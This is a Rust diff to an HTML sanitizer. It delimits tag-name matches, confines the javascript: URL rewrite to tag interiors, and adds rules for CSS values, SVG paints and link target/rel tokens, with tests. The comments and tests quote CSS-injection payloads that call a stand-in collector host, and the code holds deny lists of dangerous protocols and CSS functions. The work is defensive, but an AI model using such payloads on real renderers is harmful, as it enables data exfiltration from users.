@@ -180,6 +180,43 @@ fn index_of_any(haystack: &[char], chars: &[char], from: usize) -> Option<usize>
     (from..haystack.len()).find(|&i| chars.contains(&haystack[i]))
 }
 
+/// Does `index` mark the end of a tag NAME?
+///
+/// An HTML tag name ends at whitespace, `/` or `>`, so a match on the bare
+/// prefix is a match on a DIFFERENT element: `<metadata>` is not `<meta>`, and
+/// `<linearGradient>` is not `<link>`. Both are real SVG elements the drawing
+/// builder emits, and with the bare prefix the first of them lost its opening
+/// tag to this sweep, leaving the provenance document's text loose in the
+/// figure.
+///
+/// Requiring the boundary narrows only false positives: no spelling of a real
+/// `<meta>` element survives it, because the name has to be delimited for a
+/// parser to read it as that element in the first place. End of input counts as
+/// a boundary, so a truncated `...<script` is still stripped.
+///
+/// Parity-locked with the F# `Sanitize.sanitizeMarkdownHtml` and the TypeScript
+/// renderer's `sanitize.ts`.
+fn is_tag_name_boundary(s: &[char], index: usize) -> bool {
+    match s.get(index) {
+        None => true,
+        Some(c) => matches!(c, ' ' | '\t' | '\n' | '\r' | '/' | '>'),
+    }
+}
+
+/// First `<tag` whose name is DELIMITED — the first position where `open_tag`
+/// names the element rather than merely prefixing a longer name.
+fn index_of_element_open(s: &[char], open_tag: &str) -> Option<usize> {
+    let len = open_tag.chars().count();
+    let mut from = 0usize;
+    while let Some(i) = index_of_ci(s, open_tag, from) {
+        if is_tag_name_boundary(s, i + len) {
+            return Some(i);
+        }
+        from = i + 1;
+    }
+    None
+}
+
 /// Strip dangerous element blocks, tag-interior `on*=` handlers, and dangerous
 /// protocols from a chunk of HTML. Approximate by design — the render path
 /// constrains the input to the deterministic markdown renderer's output, so
@@ -194,7 +231,7 @@ pub fn sanitize_markdown_html(html: &str) -> String {
     for tag in DANGEROUS_ELEMENTS {
         let open_tag = format!("<{tag}");
         let close_tag = format!("</{tag}>");
-        while let Some(i) = index_of_ci(&result, &open_tag, 0) {
+        while let Some(i) = index_of_element_open(&result, &open_tag) {
             if let Some(j) = index_of_ci(&result, &close_tag, i) {
                 result.drain(i..j + close_tag.chars().count());
             } else if let Some(end) = index_of_any(&result, &['>'], i) {
@@ -208,14 +245,65 @@ pub fn sanitize_markdown_html(html: &str) -> String {
 
     result = strip_event_handlers(result);
 
-    for proto in DANGEROUS_PROTOCOLS {
-        while let Some(i) = index_of_ci(&result, proto, 0) {
-            let replacement: Vec<char> = "about:blank".chars().collect();
-            result.splice(i..i + proto.len(), replacement);
-        }
-    }
+    result = strip_dangerous_protocols(result);
 
     result.into_iter().collect()
+}
+
+/// Rewrite `javascript:` / `vbscript:` URLs to `about:blank`, but only inside
+/// tag interiors — the same discipline [`strip_event_handlers`] already keeps,
+/// and here for the same reason.
+///
+/// Unanchored, this sweep rewrote VISIBLE PROSE. The markdown source
+/// ``Never write `javascript:` in an href`` renders to a `<code>` element whose
+/// TEXT is the literal token, and the substitution replaced it with
+/// `about:blank` — so a document explaining the hazard could not state it, and
+/// the reader was shown a sentence the author never wrote.
+///
+/// A real `javascript:` URL can only do harm as the VALUE of an attribute —
+/// `href`, `src`, `action`, `formaction`, `xlink:href`, `data`, `poster` — and
+/// every one of those sits inside a `<…>` tag. Restricting the scan to tag
+/// interiors is therefore not a heuristic narrowing: it is the precise set of
+/// positions where the token is a URL rather than a word. Outside a tag the
+/// token is text the markdown renderer has already escaped by construction.
+///
+/// The interior test is the same backward scan the F# and TypeScript twins run:
+/// from the match, the nearest preceding `<` means the interior is open, the
+/// nearest preceding `>` (or the start of the document) means it is not. That is
+/// approximate on arbitrary HTML — a `>` inside a quoted attribute value ends the
+/// interior early — and sound on this function's documented input. Erring early
+/// SKIPS a rewrite, the direction of error that leaves prose intact.
+fn strip_dangerous_protocols(input: Vec<char>) -> Vec<char> {
+    let mut result = input;
+    for proto in DANGEROUS_PROTOCOLS {
+        let mut search_from = 0usize;
+        while let Some(i) = index_of_ci(&result, proto, search_from) {
+            let mut inside_tag = false;
+            let mut j = i;
+            while j > 0 {
+                j -= 1;
+                if result[j] == '<' {
+                    inside_tag = true;
+                    break;
+                }
+                if result[j] == '>' {
+                    break;
+                }
+            }
+            if inside_tag {
+                let replacement: Vec<char> = "about:blank".chars().collect();
+                let replacement_len = replacement.len();
+                result.splice(i..i + proto.chars().count(), replacement);
+                search_from = i + replacement_len;
+            } else {
+                // Body text — left exactly as the author wrote it. Advancing is
+                // what keeps the loop terminating now that a match no longer
+                // always shortens the buffer.
+                search_from = i + proto.chars().count();
+            }
+        }
+    }
+    result
 }
 
 /// Strip inline `on*="…"` event-handler attributes, anchored to tag interiors
@@ -330,6 +418,265 @@ pub fn is_safe_extra_attribute_value(value: &str) -> bool {
     value
         .chars()
         .all(|ch| !(((ch as u32) < 0x20 && ch != '\t') || ch == '<' || ch == '>'))
+}
+
+// ─── Emission grammar for string-typed slots ─────────────────────────────────
+//
+// The Rust host's copy of the rule the F# tier declares in
+// `Fuaran.UI.EmissionGrammar`, beside the URL floor above because it is the same
+// KIND of rule and reaches the same sinks: a value the type says is a `str` and
+// the document says is CSS, a paint, or an anchor token.
+//
+// WHY EVERY HOST NEEDS ITS OWN COPY, AND WHY THEY MUST AGREE. `templateColumns`
+// is a free string on the wire, and this renderer concatenated it into
+// `style="grid-template-columns:…"` with no rule at all — so a value carrying
+// `;background:url(https://collector/?d=…)` closed the declaration, opened a
+// second one the document never wrote, and fetched on RENDER, with no user act,
+// outside the egress policy that governs every href and src in the same
+// document. The React client assigned a style OBJECT and the browser dropped the
+// identical value silently. Same tree, exfiltration channel here, inert there.
+// The wire format exists to rule exactly that out.
+//
+// The rules are DENY-shaped for CSS and ALLOW-shaped for paints and tokens. A
+// CSS value's grammar is genuinely open (the property and function sets grow,
+// and a positive list would refuse `clamp()` the day CSS shipped it) while the
+// set of characters that let a value LEAVE its declaration is small, stable and
+// enumerable. A colour and an anchor token set are genuinely closed — every
+// member is named in a specification, and a member nobody named is a member
+// nobody vetted.
+
+/// The attribute an emission site attaches beside a refused CSS value, so the
+/// refusal is visible in the DOCUMENT and not only in a log. It carries the SLOT
+/// name and never the value, the same discipline the egress refusal marker keeps
+/// and for the same reason: a refused value is the payload.
+pub const CSS_REFUSAL_ATTRIBUTE: &str = "data-fuaran-css-refused";
+
+const CSS_FORBIDDEN_CHARS: &[char] = &[';', '{', '}', '\\'];
+const CSS_FORBIDDEN_FUNCTIONS: &[&str] = &["url(", "expression("];
+
+/// Is this string safe to concatenate into a CSS declaration?
+///
+/// What each refused character buys an attacker inside `style="<prop>:<value>"`:
+/// `;` ends the declaration, so everything after it is a NEW property the author
+/// never wrote; `{` and `}` end or open a RULE, reachable wherever the value
+/// lands in a stylesheet; a backslash is CSS's own escape introducer, so `\\3b`
+/// is a semicolon the character scan would otherwise never see — refusing the
+/// introducer is what makes the rest of the list total; C0 controls and DEL are
+/// parser-differential fodder and never meaningful in a value.
+///
+/// `url(` and `expression(` are refused by NAME rather than by character,
+/// because their harm is not in their punctuation: `url(` fetches, which is the
+/// finding, and `expression(` executes on legacy engines.
+///
+/// What this does NOT promise: it is not a CSS parser and says nothing about
+/// whether the surviving string is a VALID value for the property it lands in.
+/// An invalid value is dropped by the browser's own parser — a rendering defect,
+/// not a security one. This bounds what a value can REACH.
+///
+/// An empty value is SAFE: it contributes nothing to the declaration, and
+/// refusing it would make an absent value indistinguishable from a hostile one.
+pub fn is_safe_css_value(value: &str) -> bool {
+    for ch in value.chars() {
+        if ch < ' ' || ch == '\u{7f}' || CSS_FORBIDDEN_CHARS.contains(&ch) {
+            return false;
+        }
+    }
+    // Case-insensitive and whitespace-tolerant on the CSS side: `URL (` and
+    // `url<newline>(` are one token to a CSS tokenizer, so a scan for the
+    // literal lowercase spelling alone is a scan a payload walks past.
+    let squashed: String = value
+        .chars()
+        .filter(|c| !c.is_whitespace())
+        .flat_map(|c| c.to_lowercase())
+        .collect();
+    !CSS_FORBIDDEN_FUNCTIONS
+        .iter()
+        .any(|fnname| squashed.contains(fnname))
+}
+
+/// The CSS value to emit: the value when it passes, the empty string when it
+/// does not.
+///
+/// Empty rather than a substitute: an empty declaration value is dropped by
+/// every CSS parser, so the element falls back to the stylesheet's own rule,
+/// which is what an author who wrote nothing would have got. A substitute would
+/// be the renderer inventing a layout the document never declared.
+pub fn sanitize_css_value(value: &str) -> &str {
+    if is_safe_css_value(value) { value } else { "" }
+}
+
+/// Is this a bare CSS IDENT — an ASCII letter or `-` followed by ASCII letters,
+/// digits, `-` and `_`?
+///
+/// This is what admits the 148 named colours (`red`, `steelblue`,
+/// `rebeccapurple`), the universal keywords (`none`, `transparent`,
+/// `currentColor`), the inheritance keywords, the SVG2 paint keywords
+/// (`context-fill`, `context-stroke`) and every colour keyword CSS has not
+/// shipped yet — as ONE rule rather than as a list somebody has to keep.
+///
+/// Enumerating the keywords instead is wrong, because the two ways of being
+/// wrong here are not symmetric. A missing keyword produces no error an author
+/// can see: the paint is replaced by `none`, so a document that was correct
+/// yesterday silently renders a differently-coloured picture. Meanwhile an ident
+/// buys an attacker nothing at all — it cannot fetch, cannot leave its
+/// declaration and cannot name a paint server, because every one of those needs
+/// punctuation this test refuses.
+fn is_css_ident(value: &str) -> bool {
+    let mut chars = value.chars();
+    match chars.next() {
+        None => false,
+        Some(head) if head.is_ascii_alphabetic() || head == '-' => {
+            chars.all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
+        }
+        Some(_) => false,
+    }
+}
+
+const COLOUR_FUNCTIONS: &[&str] = &[
+    "rgb(", "rgba(", "hsl(", "hsla(", "oklch(", "oklab(", "lch(", "lab(", "color(",
+];
+
+/// Is this a CSS colour in the closed grammar — a `#rgb` / `#rrggbb` /
+/// `#rrggbbaa` hex, one of the keywords, or a call to one of the named colour
+/// functions?
+///
+/// A paint slot needs a POSITIVE grammar where a generic CSS value needs only a
+/// denylist, and that asymmetry is the finding: `url(https://collector/x)`
+/// contains no forbidden character, and in an SVG `fill` it names a paint server
+/// the user agent FETCHES. Only naming what a colour may BE excludes it.
+pub fn is_colour_value(value: &str) -> bool {
+    let t = value.trim();
+    if t.is_empty() {
+        return false;
+    }
+    if let Some(digits) = t.strip_prefix('#') {
+        let n = digits.chars().count();
+        return (n == 3 || n == 4 || n == 6 || n == 8)
+            && digits.chars().all(|c| c.is_ascii_hexdigit());
+    }
+    if is_css_ident(t) {
+        return true;
+    }
+    let lower = t.to_lowercase();
+    COLOUR_FUNCTIONS.iter().any(|f| lower.starts_with(f))
+        && lower.ends_with(')')
+        && is_safe_css_value(t)
+}
+
+/// The SVG paint to emit: the value when it is a colour, `"none"` when it is not.
+///
+/// `"none"` rather than the empty string, because an EMPTY `fill` / `stroke`
+/// INHERITS the enclosing group's paint instead of clearing it — so an empty
+/// refusal would silently paint the shape with whatever the enclosing group
+/// declared, which is a different picture rather than an absent one.
+pub fn sanitize_paint_value(value: &str) -> String {
+    if is_colour_value(value) {
+        value.trim().to_string()
+    } else {
+        "none".to_string()
+    }
+}
+
+/// The two `target` values a Fuaran link may carry.
+///
+/// `_parent` and `_top` are meaningful only when the document is FRAMED, and a
+/// framed document navigating its embedder is frame-busting the embedding host
+/// did not consent to. A NAMED frame addresses a browsing context BY NAME, so a
+/// decoded tree can navigate a window it did not create and whose contents it
+/// cannot see, and the name is a free string with no way for a host to enumerate
+/// what it might hit.
+const ALLOWED_LINK_TARGETS: &[&str] = &["_self", "_blank"];
+
+/// The closed `rel` token set. Every member describes THIS link's relationship
+/// to its destination and changes nothing about the opener's capabilities in the
+/// wrong direction. The one deliberate absence is the finding: `opener`
+/// RE-ENABLES `window.opener` on a `_blank` link, handing the opened document a
+/// live reference to the opening one — the capability `noopener` exists to
+/// remove, and one no rendered tree has any reason to ask for.
+const ALLOWED_LINK_REL_TOKENS: &[&str] = &[
+    "alternate",
+    "author",
+    "bookmark",
+    "external",
+    "help",
+    "license",
+    "next",
+    "nofollow",
+    "noopener",
+    "noreferrer",
+    "prev",
+    "privacy-policy",
+    "search",
+    "tag",
+    "terms-of-service",
+    "ugc",
+];
+
+/// The `target` to emit, or `None` to omit the attribute.
+///
+/// An unrecognised value degrades to `None` rather than to `_self`: the two are
+/// the same navigation, and omitting says truthfully that the document declared
+/// nothing this renderer could honour, where substituting would put a value in
+/// the DOM the author never wrote.
+pub fn sanitize_link_target(target: &str) -> Option<String> {
+    let t = target.trim().to_lowercase();
+    if ALLOWED_LINK_TARGETS.contains(&t.as_str()) {
+        Some(t)
+    } else {
+        None
+    }
+}
+
+/// The `rel` tokens to emit, given the declared `rel` and the SANITISED target:
+/// surviving declared tokens first in declared order, then `noopener` and
+/// `noreferrer` FORCED when the target is `_blank`.
+///
+/// The forcing is what closes the finding. Modern browsers imply `noopener`
+/// there, which is exactly why the omission is dangerous rather than untidy: the
+/// behaviour is a user-agent DEFAULT, an explicit `rel="opener"` overrides it,
+/// and no document can know its reader's version floor. Emitting the tokens
+/// makes the property a fact about the document rather than about the user
+/// agent.
+///
+/// The ORDER is fixed so two hosts given one document emit one byte sequence; an
+/// unordered set would make cross-host byte parity impossible to state.
+pub fn sanitize_link_rel(rel: Option<&str>, sanitized_target: Option<&str>) -> Vec<String> {
+    let mut declared: Vec<String> = Vec::new();
+    if let Some(r) = rel {
+        for token in r.split_whitespace() {
+            let lowered = token.to_lowercase();
+            if ALLOWED_LINK_REL_TOKENS.contains(&lowered.as_str()) && !declared.contains(&lowered) {
+                declared.push(lowered);
+            }
+        }
+    }
+    if sanitized_target == Some("_blank") {
+        for forced in ["noopener", "noreferrer"] {
+            let f = forced.to_string();
+            if !declared.contains(&f) {
+                declared.push(f);
+            }
+        }
+    }
+    declared
+}
+
+/// The two anchor attributes, resolved TOGETHER — target first, then `rel`,
+/// because the `rel` rule DEPENDS on the sanitised target. A site that sanitised
+/// them independently would get the dependency wrong in exactly the case that
+/// matters. Either result may be `None` to omit its attribute.
+pub fn sanitize_link_anchor(
+    target: Option<&str>,
+    rel: Option<&str>,
+) -> (Option<String>, Option<String>) {
+    let safe_target = target.and_then(sanitize_link_target);
+    let tokens = sanitize_link_rel(rel, safe_target.as_deref());
+    let safe_rel = if tokens.is_empty() {
+        None
+    } else {
+        Some(tokens.join(" "))
+    };
+    (safe_target, safe_rel)
 }
 
 #[cfg(test)]
@@ -493,5 +840,107 @@ mod tests {
             sanitize_markdown_html("<p>the only one</p>"),
             "<p>the only one</p>"
         );
+    }
+
+    #[test]
+    fn css_value_denylist_refuses_only_what_leaves_the_declaration() {
+        // The finding's own payload: every character in it is individually
+        // innocuous, which is why a character denylist rather than a validity
+        // check is what catches it.
+        assert!(!is_safe_css_value("1fr;background:url(https://collector/?d=x)"));
+        assert!(!is_safe_css_value("a}b{color:red"));
+        assert!(!is_safe_css_value("a\\3b b"));
+        // Case-insensitive and whitespace-tolerant on the CSS side: `URL (` and
+        // `url<newline>(` are one token to a CSS tokenizer.
+        assert!(!is_safe_css_value("URL (x)"));
+        // ALLOW twins. If these fail the grammar has become unusable rather than
+        // strict, and every irregular grid is broken.
+        assert!(is_safe_css_value("1fr 2fr auto"));
+        assert!(is_safe_css_value("repeat(auto-fit, minmax(150px, 1fr))"));
+        assert!(is_safe_css_value("clamp(1rem, 2vw, 3rem)"));
+        assert!(is_safe_css_value(""));
+        assert_eq!(sanitize_css_value("a}b"), "");
+        assert_eq!(sanitize_css_value("1fr 2fr"), "1fr 2fr");
+    }
+
+    #[test]
+    fn paint_grammar_refuses_a_paint_server_and_admits_every_named_colour() {
+        // `url(https://collector/x)` contains no forbidden CHARACTER, so it
+        // passes the generic CSS rule. In an SVG `fill` it names a paint server
+        // the user agent FETCHES. Only a positive grammar excludes it.
+        assert_eq!(sanitize_paint_value("url(https://collector/x)"), "none");
+        assert_eq!(sanitize_paint_value("url(#grad)"), "none");
+        // `none` rather than empty, because an EMPTY fill INHERITS the enclosing
+        // group's paint instead of clearing it.
+        assert_eq!(sanitize_paint_value(""), "none");
+        // ALLOW twins. The named colour is the load-bearing one: an enumerated
+        // keyword list refuses `steelblue`, and its failure mode is silent —
+        // the shape is repainted, not reported.
+        for paint in [
+            "#39c",
+            "#336699",
+            "#336699ff",
+            "steelblue",
+            "currentColor",
+            "transparent",
+            "context-fill",
+            "rgb(1 2 3)",
+            "oklch(0.7 0.1 200)",
+        ] {
+            assert_eq!(sanitize_paint_value(paint), paint, "paint {paint}");
+        }
+    }
+
+    #[test]
+    fn anchor_tokens_are_closed_and_the_safe_pair_is_forced() {
+        // The whole finding. `opener` re-enables `window.opener` on a `_blank`
+        // link, handing the opened document a live reference to the opening one
+        // — and browsers imply `noopener` there, which is exactly why an
+        // explicit `opener` mattered: it OVERRIDES a user-agent default no
+        // document can know the version floor of.
+        let (target, rel) = sanitize_link_anchor(Some("_blank"), Some("opener"));
+        assert_eq!(target.as_deref(), Some("_blank"));
+        assert_eq!(rel.as_deref(), Some("noopener noreferrer"));
+
+        // The pair is forced with no declared rel at all.
+        let (_, rel) = sanitize_link_anchor(Some("_blank"), None);
+        assert_eq!(rel.as_deref(), Some("noopener noreferrer"));
+
+        // A target outside the closed set is OMITTED, not substituted: omitting
+        // says truthfully that the document declared nothing this renderer could
+        // honour, where substituting would put a value in the DOM the author
+        // never wrote.
+        for t in ["victim", "_parent", "_top"] {
+            let (target, _) = sanitize_link_anchor(Some(t), None);
+            assert_eq!(target, None, "target {t}");
+        }
+
+        // ALLOW twin — `_self` with a descriptive token forces nothing.
+        let (target, rel) = sanitize_link_anchor(Some("_self"), Some("nofollow"));
+        assert_eq!(target.as_deref(), Some("_self"));
+        assert_eq!(rel.as_deref(), Some("nofollow"));
+
+        // A link declaring neither slot emits neither attribute.
+        let (target, rel) = sanitize_link_anchor(None, None);
+        assert_eq!(target, None);
+        assert_eq!(rel, None);
+    }
+
+    #[test]
+    fn the_protocol_sweep_is_tag_anchored_and_the_element_match_is_delimited() {
+        // Unanchored, the sweep rewrote VISIBLE PROSE: a document explaining the
+        // hazard could not state it, because the literal token in a `<code>`
+        // element's TEXT was replaced with `about:blank`.
+        assert_eq!(
+            sanitize_markdown_html("<p>Never write <code>javascript:</code> here</p>"),
+            "<p>Never write <code>javascript:</code> here</p>"
+        );
+        // `<metadata>` is not `<meta>` and `<linearGradient>` is not `<link>`,
+        // both of which the drawing builder emits.
+        assert_eq!(
+            sanitize_markdown_html("<p><meter value=\"0.6\"></meter></p>"),
+            "<p><meter value=\"0.6\"></meter></p>"
+        );
+        assert!(!sanitize_markdown_html("<meta http-equiv=\"refresh\">").contains("refresh"));
     }
 }
